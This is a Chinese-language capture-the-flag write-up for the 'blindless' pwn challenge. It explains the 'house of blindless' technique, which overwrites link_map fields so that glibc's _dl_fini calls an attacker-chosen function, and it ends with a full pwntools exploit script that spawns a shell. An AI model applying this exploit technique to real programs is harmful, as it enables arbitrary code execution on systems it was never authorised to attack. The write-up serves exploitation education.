# blindless

> 以后遇到这种奇奇怪怪的题应该一眼就看出来是某种 house 的。。

## Analysis

程序漏洞：

给了一个类似 bf 的 vm 程序，不过难得的逻辑很简单，可以实现在堆地址上加偏移的任意地址写，但是没有泄漏，这很明显需要某种 HOUSE 来打，这里考虑到 `house of blindless`：

低字节覆盖 `l->l_addr` 和 `l->l_info[DT_FINI_ARRAY/DT_FINI]->d_un.d_ptr`，即可调用 elf 中的任意函数，要求：

- 能够实现 elf 或 libc 范围内的任意地址写（本题可以分配大型堆块到 libc 前，进而实现 libc 范围内的任意写）

- 程序正常退出

参考到 ld.so 源码，elf/dl-fini.c 中的 _dl_fini() 函数中：

```c
/* 其中关键定义如下： */
#define DT_INIT 12
#define DT_FINI 13
#define DT_FINI_ARRAY 26

/* Is there a destructor function?  */
if (l->l_info[DT_FINI_ARRAY] != NULL || l->l_info[DT_FINI] != NULL)
{
    /* When debugging print a message first.  */
    if (__builtin_expect (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS, 0))
        _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
                          DSO_FILENAME (l->l_name),
                          ns);

    /* First see whether an array is given.  */
    if (l->l_info[DT_FINI_ARRAY] != NULL) // 分支1
    {
        ElfW(Addr) *array =
            (ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
        unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
        while (i-- > 0)
            ((fini_t) array[i]) ();
    }

    /* Next try the old-style destructor.  */
    if (l->l_info[DT_FINI] != NULL) // 分支2
        DL_CALL_DT_FINI (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
}
```

这里有两条分支，要劫持控制流就需要到达控制 `l->l_info[26] == 0` 绕过分支1，接下来分为能控制 elf+libc 和 仅能控制 libc 的两种情况：

**控制 elf+libc**：

> 由于能控制 elf，就可以改到 l->l_info[DT_FINI] 上具体的值，进而直接在 l_addr 的基础上进行任意 elf 地址调用。

```c
l->l_info[13]->d_un.d_ptr = <target> - elf_base;
l->l_info[26] = 0;
/* 通过控制 _rtld_global+2312 来控制第一个参数 */
```

**若仅能控制 libc**：

```c
/* 在 l->l_info[13] 附近找到其他 Elf64_Dyn 类型结构体，且其 d_un.d_ptr 正好满足我们需求 */
*(char *)l->l_addr = <target> & 0xff // 改写低位
l->l_info[26] = 0;
/* 通过控制 _rtld_global+2312 来控制第一个参数 */
```

## Exploitation

于是利用第二种思路得到本题 exp：

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


payload = b""


def go_forward(distance):
    global payload
    payload += b"@"
    payload += p32(distance)


def next_byte():
    global payload
    payload += b">"


def next_long():
    global payload
    payload += b"+"


def change_byte(data):
    global payload
    lg("data", data)
    payload += b"."
    payload += p8(data)


def edit(data):
    global payload
    for i in range(len(data)):
        change_byte(data[i])
        next_byte()


DT_FINI = 13
DT_INIT = 12
DT_FINI_ARRAY = 26
_rtld_global_to_chunk = 0x323060
arg0 = _rtld_global_to_chunk + 2312
l_addr = 0x324190


go_forward(arg0 - 0x10)
edit(b"/bin/sh\x00")
go_forward(l_addr - arg0 - 8)
edit(p8(0xE0))
go_forward(0xA8 - 1)
edit(p8(0xA8))
go_forward(0x68 - 1)
edit(p64(0))

payload += b"q"

ru(b"Pls input the data size\n")
sl(i2b(0x100000))
ru(b"Pls input the code size\n")
sl(i2b(0x100))
ru(b"Pls input your code\n")
s(payload)

ia()
```
